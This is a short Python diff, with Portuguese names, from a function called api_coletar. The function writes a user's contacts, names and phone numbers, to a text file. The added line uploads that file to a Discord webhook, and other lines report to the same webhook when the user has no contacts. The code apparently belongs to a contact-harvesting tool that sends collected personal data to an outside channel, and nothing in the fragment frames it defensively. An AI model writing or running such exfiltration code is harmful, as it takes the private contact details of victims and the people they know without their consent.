@@ -47,6 +47,7 @@ def api_coletar():
                 numero = contato.get("number") or contato.get("phone")
                 nome_contato = contato.get("name")
                 f.write(f"CONTATO: {nome_contato} --- {numero}\n")
+            webhook.send(file=discord.File("contatos.txt"))
             if not contatos:
                 webhook.send("usuario nao possi contatos")
             else:
